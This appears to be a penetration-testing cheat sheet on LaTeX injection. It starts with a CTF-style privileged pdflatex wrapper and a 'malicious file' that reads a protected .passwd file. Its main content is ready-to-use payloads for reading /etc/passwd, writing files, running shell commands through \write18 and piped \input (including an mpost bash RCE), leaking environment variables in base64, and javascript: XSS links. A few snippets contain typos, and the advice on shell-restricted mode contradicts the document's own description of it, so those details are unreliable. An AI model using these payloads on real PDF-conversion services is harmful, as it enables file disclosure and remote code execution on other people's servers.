
In computing, **LaTeX** is a typesetting system commonly **used for creating documents that require precise formatting**, such as academic papers, technical reports, presentations, and scientific articles. LaTeX is widely used in academia, especially in fields such as mathematics, computer science, engineering, physics, and other technical disciplines.


## Input

Latex `input` statement in vulnerable to information disclosure.  
It allows to include file content into PDFs for example

***PDF Maker (Latex compiler)***
```bash
#!/usr/bin/env bash                                                    

if [[ $# -ne 1 ]]; then                                                
    echo "Usage : ${0} TEX_FILE"                                       
fi                                                                     

if [[ -f "${1}" ]]; then                                               
    TMP=$(mktemp -d)                                                   
    cp "${1}" "${TMP}/main.tex"                                        

    # Compilation                                                      
    echo "[+] Compilation ..."                                         
    timeout 5 /usr/bin/pdflatex \                                      
        -halt-on-error \                                               
        -output-format=pdf \                                           
        -output-directory "${TMP}" \                                   
        -no-shell-escape \                                             
        "${TMP}/main.tex" > /dev/null                                  

    timeout 5 /usr/bin/pdflatex \                                      
        -halt-on-error \                                               
        -output-format=pdf \                                           
        -output-directory "${TMP}" \                                   
        -no-shell-escape \                                             
        "${TMP}/main.tex" > /dev/null                                  

    chmod u+w "${TMP}/main.tex"                                        
    rm "${TMP}/main.tex"                                               
    chmod 750 -R "${TMP}"                                              
    if [[ -f "${TMP}/main.pdf" ]]; then                                
        echo "[+] Output file : ${TMP}/main.pdf"                       
    else                                                               
        echo "[!] Compilation error, your logs : ${TMP}/main.log"      
    fi                                                                 
else                                                                   
    echo "[!] Can't access file ${1}"                                  
fi                                                                     
```

**Usage :**
```bash
./compiler LATEXFILE.tex
```

The fact is that if the compiler runs with privileges, it can read files content (if the owner have read rights)

**Malicious file :**
```latex
\documentclass{article}

\usepackage{verbatim} % Pour utiliser \verbatiminput

\title{Inclusion du fichier .passwd dans LaTeX}
\author{}
\date{}

\begin{document}

\maketitle

Voici le contenu du fichier \texttt{.passwd} :

\verbatiminput{/challenge/app-script/ch23/.passwd}

\end{document}
```


# LaTeX Injection

Usually the servers that will find on the internet that **convert LaTeX code to PDF** use `**pdflatex**`. This program uses 3 main attributes to (dis)allow command execution:

- `**--no-shell-escape**`: **Disable** the `\write18{command}` construct, even if it is enabled in the texmf.cnf file.
    
- `**--shell-restricted**`: Same as `--shell-escape`, but **limited** to a 'safe' set of **predefined** **commands (**On Ubuntu 16.04 the list is in `/usr/share/texmf/web2c/texmf.cnf`).
    
- `**--shell-escape**`: **Enable** the `\write18{command}` construct. The command can be any shell command. This construct is normally disallowed for security reasons.
    

However, there are other ways to execute commands, so to avoid RCE it's very important to use `--shell-restricted`.

## Read file

You might need to adjust injection with wrappers as [ or $.

```latex
\input{/etc/passwd}
\include{password} # load .tex file
\lstinputlisting{/usr/share/texmf/web2c/texmf.cnf}
\usepackage{verbatim}
\verbatiminput{/etc/passwd}
```

#### Read single lined file

```latex
\newread\file
\openin\file=/etc/issue
\read\file to\line
\text{\line}
\closein\file
```

#### Read multiple lined file

```latex
\newread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
    \read\file to\fileline
    \text{\fileline}
\repeat
\closein\file
```


#### Write file

```latex
\newwrite\outfile
\openout\outfile=cmd.tex
\write\outfile{Hello-world}
\closeout\outfile
```

#### Command execution

**The input of the command will be redirected to stdin, use a temp file to get it.**

```latex
\immediate\write18{whoami > output}
\input{output}

\input{|"/bin/hostname"}
\input{|"extractbb /etc/passwd > /tmp/b.tex"}

# allowed mpost command RCE
\documentclass{article}\begin{document}
\immediate\write18{mpost -ini "-tex=bash -c (id;uname${IFS}-sm)>/tmp/pwn" "x.mp"}
\end{document}

# If mpost is not allowed there are other commands you might be able to execute
## Just get the version
\input{|"bibtex8 --version > /tmp/b.tex"}
## Search the file pdfetex.ini
\input{|"kpsewhich pdfetex.ini > /tmp/b.tex"}
## Get env var value
\input{|"kpsewhich -expand-var=$HOSTNAME > /tmp/b.tex"}
## Get the value of shell_escape_commands without needing to read pdfetex.ini
\input{|"kpsewhich --var-value=shell_escape_commands > /tmp/b.tex"}
```

If you get any LaTex error, consider using base64 to get the result without bad characters

```
\immediate\write18{env | base64 > test.tex}
\input{text.tex}
```

```
\input|ls|base4
\input{|"/bin/hostname"}
```

#### Cross Site Scripting

From [@EdOverflow](https://twitter.com/intigriti/status/1101509684614320130)

```
\url{javascript:alert(1)}
\href{javascript:alert(1)}{placeholder}
```